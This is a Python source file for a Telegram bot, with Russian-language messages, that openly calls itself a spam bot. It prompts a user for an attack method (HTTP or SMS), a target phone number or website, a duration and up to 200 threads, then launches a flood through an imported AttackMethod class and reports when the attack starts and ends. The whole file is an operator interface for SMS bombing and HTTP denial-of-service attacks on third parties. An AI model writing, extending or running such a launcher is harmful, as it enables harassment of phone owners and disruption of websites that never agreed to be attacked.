import os
import sys
import argparse

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor

from loader import dp, bot
from states import SpamState
from tools.crash import CriticalError
import tools.addons.clean
import tools.addons.logo
import tools.addons.winpcap
from tools.method import AttackMethod

os.chdir(os.path.dirname(os.path.realpath(__file__)))


@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    """Приветственное сообщение"""
    await message.answer("Привет! Я спам-бот")


@dp.message_handler(lambda message: message.text == 'спам'.lower())
async def get_method(message: types.Message):
    await message.answer('Введите метод (HTTP, SMS)')
    await SpamState.method.set()


@dp.message_handler(lambda message: message.text == 'стоп'.lower())
async def stop_atack(message: types.Message, state: FSMContext):
    await state.reset_state()
    await message.answer('Атака остановлена!')


@dp.message_handler(state=SpamState.method)
async def add_method(message: types.Message, state: FSMContext):
    global method
    method = message.text.upper()
    await state.update_data(answer1=method)
    await message.answer('Введите номер телефона или адрес сайта')
    await SpamState.target.set()


@dp.message_handler(state=SpamState.target)
async def add_time(message: types.Message, state: FSMContext):
    global target
    target = message.text
    await state.update_data(answer1=target)
    await message.answer('Введите время спама')
    await SpamState.time.set()


@dp.message_handler(state=SpamState.time)
async def add_threads(message: types.Message, state: FSMContext):
    global time
    time = message.text
    await state.update_data(answer1=time)
    await message.answer('Введите количество потоков (1 - 200)')
    await SpamState.threads.set()


@dp.message_handler(state=SpamState.threads)
async def add_threads(message: types.Message, state: FSMContext):
    global threads
    threads = message.text
    await state.update_data(answer1=threads)
    try:
        await message.answer(f'⚠️Атака начата!⚠️\n\n'
                             f'1️⃣  Метод: {method};\n'
                             f'2️⃣  Цель: {target};\n'
                             f'3️⃣  Кол-во потоков: {threads}\n'
                             f'4️⃣  Время спама: {time}\n\n')

        with AttackMethod(
            duration=int(time), name=method, threads=int(threads), target=target
        ) as Flood:
            Flood.Start()
        await message.answer('✅Атака закончена!✅')
        await state.finish()
    except Exception:
        await state.reset_state()
        await message.answer('Ошибка!!!')


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
